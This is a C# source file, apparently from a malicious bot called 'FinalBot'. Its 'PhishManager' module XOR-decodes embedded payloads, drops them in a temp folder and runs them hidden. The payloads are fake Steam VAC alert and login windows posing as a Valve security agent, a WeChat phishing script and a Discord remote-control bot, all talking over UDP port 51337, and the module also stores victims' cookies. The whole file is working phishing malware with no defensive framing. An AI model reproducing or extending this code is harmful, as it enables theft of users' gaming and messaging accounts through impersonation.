using System;
using System.IO;
using System.Reflection;
using System.Diagnostics;
using System.Threading.Tasks;

namespace FinalBot.Modules
{
    public static class PhishManager
    {
        private static readonly string _tempDir = Path.Combine(Path.GetTempPath(), "FinalTempSys");

        private static void EnsureTempDir()
        {
            if (!Directory.Exists(_tempDir))
            {
                Directory.CreateDirectory(_tempDir);
            }
        }

        private static string ExtractResource(string resourceName, string outFileName)
        {
            EnsureTempDir();
            string outPath = Path.Combine(_tempDir, outFileName);

            // If it already exists, assume it's fine to reuse (or delete and recreate)
            if (File.Exists(outPath))
            {
                try { File.Delete(outPath); } catch { return outPath; }
            }

            try
            {
                var assembly = Assembly.GetExecutingAssembly();
                using (Stream stream = assembly.GetManifestResourceStream($"FinalBot.{resourceName}"))
                {
                    if (stream == null) return null;

                    if (resourceName.EndsWith(".bin"))
                    {
                        using (MemoryStream ms = new MemoryStream())
                        {
                            stream.CopyTo(ms);
                            byte[] bytes = ms.ToArray();
                            for (int i = 0; i < bytes.Length; i++) bytes[i] ^= VanguardCore.Constants.RESOURCE_XOR_KEY;
                            File.WriteAllBytes(outPath, bytes);
                        }
                    }
                    else
                    {
                        using (FileStream fileStream = new FileStream(outPath, FileMode.Create, FileAccess.Write))
                        {
                            stream.CopyTo(fileStream);
                        }
                    }
                }
                return outPath;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[PHISH] Failed to extract {resourceName}: {ex.Message}");
                return null;
            }
        }

        private static string _savedAgentName = "Valve_Security_Specialist_732";
        private static string _savedVacLang = "en";
        private static string _savedCookies = "";

        public static void SetAgentName(string name) => _savedAgentName = name;
        public static void SetVacLang(string lang) => _savedVacLang = lang;
        public static void SetCookies(string cookies) => _savedCookies = cookies;
        public static string GetAgentName() => _savedAgentName;
        public static string GetVacLang() => _savedVacLang;

        public static void LaunchSteamAlert()
        {
            PrepareSteamFiles(_savedAgentName, _savedCookies, _savedVacLang);
            string exePath = ExtractResource("SteamAlert.bin", "SteamAlert.exe");
            if (!string.IsNullOrEmpty(exePath))
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = exePath,
                    Arguments = $"--udp 51337 --lang {_savedVacLang}",
                    UseShellExecute = false,
                    CreateNoWindow = true
                });
            }
        }

        public static void LaunchSteamLogin(string lang = "en")
        {
            PrepareSteamFiles(_savedAgentName, _savedCookies, lang);
            string exePath = ExtractResource("SteamLogin.bin", "SteamLogin.exe");
            if (!string.IsNullOrEmpty(exePath))
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = exePath,
                    Arguments = $"--udp 51337 --lang {lang}",
                    UseShellExecute = false,
                    CreateNoWindow = true
                });
            }
        }

        public static void LaunchSteamPhish()
        {
            // Just an alias for SteamLogin with current saved settings
            LaunchSteamLogin(_savedVacLang);
        }

        public static void LaunchWeChatPhish()
        {
            string scriptPath = ExtractResource("core.wechat_phish.py", "wechat_phish.py");
            if (!string.IsNullOrEmpty(scriptPath))
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "python",
                    Arguments = $"\"{scriptPath}\" --udp 51337",
                    UseShellExecute = true,
                    CreateNoWindow = true
                });
            }
        }

        public static void LaunchDiscordRemote()
        {
            string scriptPath = ExtractResource("websocket.discord_bot.py", "discord_bot.py");
            if (!string.IsNullOrEmpty(scriptPath))
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "python",
                    Arguments = $"\"{scriptPath}\" --udp 51337",
                    UseShellExecute = false,
                    CreateNoWindow = true
                });
            }
        }

        public static void PrepareSteamFiles(string agentName, string cookies, string vacLang)
        {
            // Use a stable, temporary directory for shared files
            string tempRoot = Path.Combine(Path.GetTempPath(), "FinalTempSys");
            string tablichkaDir = Path.Combine(tempRoot, "tablichka");
            if (!Directory.Exists(tablichkaDir)) Directory.CreateDirectory(tablichkaDir);
            
            // Ensure okno exists as it might be used by other parts
            string oknoDir = Path.Combine(tempRoot, "okno");
            if (!Directory.Exists(oknoDir)) Directory.CreateDirectory(oknoDir);

            // Clean old files to ensure fresh data
            try { foreach (var file in Directory.GetFiles(tablichkaDir)) File.Delete(file); } catch { }

            if (!string.IsNullOrEmpty(agentName))
                File.WriteAllText(Path.Combine(tablichkaDir, "agent_name.txt"), agentName);
            
            if (!string.IsNullOrEmpty(cookies))
                File.WriteAllText(Path.Combine(tablichkaDir, "cookies.txt"), cookies);

            if (!string.IsNullOrEmpty(vacLang))
                File.WriteAllText(Path.Combine(tablichkaDir, "vac_lang.txt"), vacLang);
        }
    }
}
